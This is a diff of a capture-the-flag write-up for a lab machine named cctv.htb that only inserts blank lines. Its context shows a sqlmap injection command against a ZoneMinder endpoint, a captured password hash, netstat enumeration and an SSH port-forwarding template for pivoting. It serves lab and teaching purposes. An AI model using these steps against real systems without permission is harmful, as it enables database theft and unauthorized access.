@@ -48,8 +48,11 @@ getting database name ::
 ```sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=sdvf8dut513lbb3g18526692qf" --dbms=mysql --dbs --batch --threads=10```
 
 --dbms  --> db management is mysql.
+
 --dbs   --> instructing to enumerate the databases preset
+
 --batch --> to proceed with the default sqlmapping settings 
+
 --threads --> the number of requests to be sent parallely at a time.
 
 ``` database name - zm``` 
@@ -104,9 +107,13 @@ password - 989c5a8ee87a0e9521ec81a79187d162109282f0
 Checking for services running here :: ``` netstat -tulpn```
 
 -t -- tcp connections
+
 -u -- udp connections 
+
 -l -- services which are listening 
+
 -p -- to mention the program that is running 
+
 -n -- to mention the address also (ip)
 
 
@@ -123,7 +130,9 @@ ssh -L [local_port]:[target_host]:[target_port] user@ssh_server
 ```
 
 local port -- the port that our machine(attacker) will open to listen .
+
 target host -- the address that is running in the other machine ( that is localhost[127.0.0.1] here )
+
 target port -- the port where the service is running there in the other machine 
 
 ### Motioneye - 0.43.1b4 
